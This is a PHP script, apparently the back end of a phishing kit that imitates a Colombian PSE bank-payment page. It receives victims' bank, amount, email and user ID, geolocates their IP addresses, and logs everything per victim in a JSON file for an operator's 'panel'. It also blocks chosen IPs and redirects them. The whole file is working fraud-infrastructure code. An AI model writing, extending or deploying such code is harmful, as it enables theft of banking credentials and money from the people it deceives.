<?php
// send-to-panel.php - DEBUG TEMPORAL
// error_reporting(E_ALL);
// ini_set('display_errors', 1);
// ini_set('log_errors', 1);
// ini_set('error_log', 'php_errors.log');

header('Content-Type: application/json');
ob_clean();

// error_log("🎯 === SEND-TO-PANEL INICIADO ===");
// error_log("📥 Datos POST: " . print_r($_POST, true));

// Verificar que sea POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Método no permitido']);
    exit;
}

$amount = $_POST['amount'] ?? '';
$bank = $_POST['bank'] ?? '';
$email = $_POST['email'] ?? '';
$userId = $_POST['user_id'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];

error_log("📥 Datos recibidos: amount=$amount, bank=$bank, email=$email, user_id=$userId, ip=$ip");

// Validar datos requeridos
if (empty($amount) || empty($bank)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Datos incompletos']);
    exit;
}

// =============================================
// FUNCIONES NECESARIAS
// =============================================

function loadUsersData() {
    $file = 'xzw.json';
    error_log("📁 Cargando datos desde: " . realpath($file));
    
    if (!file_exists($file)) {
        error_log("📁 Archivo NO existe, retornando array vacío");
        return [];
    }
    
    $content = file_get_contents($file);
    $data = json_decode($content, true);
    
    if (json_last_error() !== JSON_ERROR_NONE) {
        error_log("❌ Error JSON: " . json_last_error_msg());
        return [];
    }
    
    error_log("📁 Datos cargados correctamente. Usuarios: " . count($data));
    return $data ?: [];
}

function isUserBlocked($username) {
    $usersData = loadUsersData();
    
    foreach ($usersData as $userData) {
        if (!empty($userData['submissions'])) {
            foreach ($userData['submissions'] as $submission) {
                if (isset($submission['data']['Usuario']) && 
                    $submission['data']['Usuario'] === $username && 
                    $userData['status'] === 'blocked') {
                    return true;
                }
            }
        }
    }
    
    return false;
}

function getLocationByIP($ip) {
    if ($ip === '127.0.0.1' || strpos($ip, '192.168.') === 0) return 'Local Network';
    
    try {
        $url = "http://ip-api.com/json/{$ip}";
        
        if (function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 5);
            curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
            $response = curl_exec($ch);
            curl_close($ch);
        } else {
            $context = stream_context_create([
                'http' => [
                    'timeout' => 5,
                    'user_agent' => 'Mozilla/5.0'
                ]
            ]);
            $response = file_get_contents($url, false, $context);
        }
        
        if ($response) {
            $data = json_decode($response, true);
            if ($data && $data['status'] === 'success') {
                $city = $data['city'] ?? '';
                $country = $data['countryCode'] ?? '';
                return $city . ($city && $country ? ', ' : '') . $country;
            }
        }
    } catch (Exception $e) {
        error_log("Error obteniendo ubicación: " . $e->getMessage());
    }
    
    return 'Unknown Location';
}

function getRandomColor() {
    $colors = ['#800080', '#050f9bff', '#d6c90eff', '#11cc1aff'];
    return $colors[array_rand($colors)];
}

// =============================================
// PROCESAMIENTO PRINCIPAL
// =============================================

try {
    // 1. VERIFICAR BLOQUEO POR USUARIO (EMAIL)
    if (!empty($email) && isUserBlocked($email)) {
        error_log("🚫 USUARIO BLOQUEADO DETECTADO - Email: $email");
        
        $usersData = loadUsersData();
        
        // BLOQUEAR LA IP ACTUAL
        if (!isset($usersData[$ip])) {
            $usersData[$ip] = [
                'color' => '#ff0000',
                'currentPage' => 'Frontend/blocked.php',
                'location' => 'Auto-Blocked',
                'status' => 'blocked',
                'last_seen' => time(),
                'submissions' => []
            ];
        } else {
            $usersData[$ip]['status'] = 'blocked';
            $usersData[$ip]['currentPage'] = 'Frontend/blocked.php';
            $usersData[$ip]['last_seen'] = time();
        }
        
        file_put_contents('xzw.json', json_encode($usersData, JSON_PRETTY_PRINT));
        
        echo json_encode([
            'success' => false, 
            'error' => "Usuario '$email' bloqueado", 
            'blocked' => true,
            'redirect' => 'blocked.php'
        ]);
        exit;
    }
    
    // 2. VERIFICAR BLOQUEO POR IP
    $usersData = loadUsersData();
    if (isset($usersData[$ip]) && $usersData[$ip]['status'] === 'blocked') {
        error_log("🚫 IP bloqueada: $ip");
        $usersData[$ip]['last_seen'] = time();
        file_put_contents('xzw.json', json_encode($usersData, JSON_PRETTY_PRINT));
        
        echo json_encode([
            'success' => false, 
            'error' => 'IP bloqueada', 
            'blocked' => true,
            'redirect' => 'blocked.php'
        ]);
        exit;
    }
    
    // 3. PROCESAR DATOS NORMALES (solo si no está bloqueado)
    $bancoData = "$bank/$amount/$email";
    $currentPage = 'pse.html';
    $location = getLocationByIP($ip);

    error_log("💰 Procesando datos: Banco=$bank, Monto=$amount, Email=$email");

    // 4. DETERMINAR SI ES NUEVO BANCO O MISMO BANCO
    $existingBanco = '';
    $lastSubmissionIndex = -1;

    if (isset($usersData[$ip]) && !empty($usersData[$ip]['submissions'])) {
        $lastSubmissionIndex = count($usersData[$ip]['submissions']) - 1;
        $lastSubmission = $usersData[$ip]['submissions'][$lastSubmissionIndex];
        $existingBanco = $lastSubmission['data']['Banco'] ?? '';
    }

    // 5. CREAR NUEVO SUBMISSION
    $timestamp = time();
    $submissionId = $ip . '_' . $timestamp . '_' . rand(1000, 9999);

    $newSubmissionData = [
        'submission_id' => $submissionId,
        'timestamp' => $timestamp,
        'data' => [
            'Banco' => $bancoData,
            'UserId' => $userId ?? '',
            'Usuario' => '',
            'NroEmpresarial' => ''
        ]
    ];

    // 6. APLICAR REGLAS HÍBRIDAS
    $action = 'new_line'; // Por defecto: nueva línea

    if (!empty($existingBanco)) {
        // Extraer solo la parte del banco (antes del primer /)
        $existingBankName = explode('/', $existingBanco)[0] ?? '';
        $newBankName = explode('/', $bancoData)[0] ?? '';
        
        if ($existingBankName === $newBankName) {
            // MISMO BANCO: Actualizar línea existente
            $action = 'update_line';
        } else {
            // NUEVO BANCO: Nueva línea
            $action = 'new_line';
        }
    }

    // 7. EJECUTAR ACCIÓN
    if ($action === 'update_line' && $lastSubmissionIndex >= 0) {
        error_log("🔄 ACTUALIZANDO LÍNEA EXISTENTE - Mismo banco");
        
        // Actualizar datos de banco en línea existente
        $usersData[$ip]['submissions'][$lastSubmissionIndex]['data']['Banco'] = $bancoData;
        if (!empty($userId)) {
            $usersData[$ip]['submissions'][$lastSubmissionIndex]['data']['UserId'] = $userId;
        }
        
    } else {
        error_log("🆕 CREANDO NUEVA LÍNEA - Razón: " . 
                 (empty($existingBanco) ? "Primer envío" : "Banco diferente"));
        
        // NUEVA LÍNEA
        if (isset($usersData[$ip])) {
            $usersData[$ip]['submissions'][] = $newSubmissionData;
        } else {
            // USUARIO NUEVO
            $usersData[$ip] = [
                'color' => getRandomColor(),
                'currentPage' => $currentPage,
                'location' => $location,
                'status' => 'online',
                'last_seen' => $timestamp,
                'submissions' => [$newSubmissionData]
            ];
        }
    }

    // 8. ACTUALIZAR INFORMACIÓN GENERAL
    if (isset($usersData[$ip])) {
        $usersData[$ip]['last_seen'] = $timestamp;
        $usersData[$ip]['currentPage'] = $currentPage;
        $usersData[$ip]['location'] = $location;
    }

    error_log("📊 Usuarios después: " . count($usersData));
    
    // Intentar guardar
    $result = file_put_contents('xzw.json', json_encode($usersData, JSON_PRETTY_PRINT));
    
    if ($result !== false) {
        error_log("✅ Datos guardados CORRECTAMENTE. Bytes escritos: $result");
        
        // Verificar que realmente se guardó
        $verifiedData = loadUsersData();
        error_log("✅ Verificación - Usuarios después de guardar: " . count($verifiedData));
        
        if (isset($verifiedData[$ip])) {
            error_log("✅ Usuario VERIFICADO en el archivo");
        } else {
            error_log("❌ Usuario NO encontrado después de guardar");
        }
        
        echo json_encode(['success' => true, 'message' => 'Datos recibidos correctamente', 'action' => $action]);
    } else {
        error_log("❌ ERROR al guardar en xzw.json");
        $error = error_get_last();
        error_log("❌ Detalles del error: " . print_r($error, true));
        echo json_encode(['success' => false, 'error' => 'Error al guardar datos']);
    }
    
} catch (Exception $e) {
    error_log("❌ Excepción en send-to-panel: " . $e->getMessage());
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Error interno del servidor: ' . $e->getMessage()]);
}

error_log("🎯 === SEND-TO-PANEL FINALIZADO ===");
?>